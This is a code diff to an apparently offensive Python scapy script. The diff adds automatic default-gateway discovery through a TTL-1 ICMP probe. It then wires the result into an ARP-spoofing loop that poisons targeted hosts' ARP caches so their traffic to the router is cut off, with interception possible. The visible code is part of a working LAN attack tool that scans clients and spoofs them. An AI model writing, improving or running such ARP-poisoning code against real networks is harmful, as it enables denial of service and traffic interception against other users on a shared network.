@@ -113,7 +113,15 @@ def Scanenetwork(timeout:int =2,subnet:str=None) -> dict:
         output[ip] = mac
     return output
     
+def getDefaultGateway():
+    #take the local ip and get an ip that outside of the subnet which forces the os to send it outside the network using trace route with ttl of 2
+    targetip = thispcay()[0]
+    targetip = [str(128 ^ int(targetip.split(".")[0]))] + targetip.split(".")[1:] # xor operation on the first byte of the ip with 128(1000 0000)cause a not operation on the first bit
+    targetip= ".".join(targetip)
+    result, unans = scapy.sr(scapy.IP(dst=targetip,ttl=(1,1))/scapy.ICMP(),verbose=False) #ttl of 1 to find only the first hop
+    return result[0].answer.src
     
+
 class Data:
     clientsFound:dict={} # {ip:mac,...}
     Scan = True
@@ -139,7 +147,7 @@ def ask(q:str,possibleanswers:list) -> str:
             return ask(q,possibleanswers)
 async def Spoof(Targets:list=Data.TargetedClients)->None:
     #currently just blocking the communication with the router
-    gateway = "192.168.30.1"
+    gateway = getDefaultGateway()
     while Data.attack:
         for ip,mac in Targets:
             scapy.sendp(builtarppacket((ip,mac),(gateway,getmymac()),arptypes.isat))
@@ -213,3 +221,4 @@ async def main()->None:
         
         
 asyncio.run(main())
+# print(getDefaultGateway())
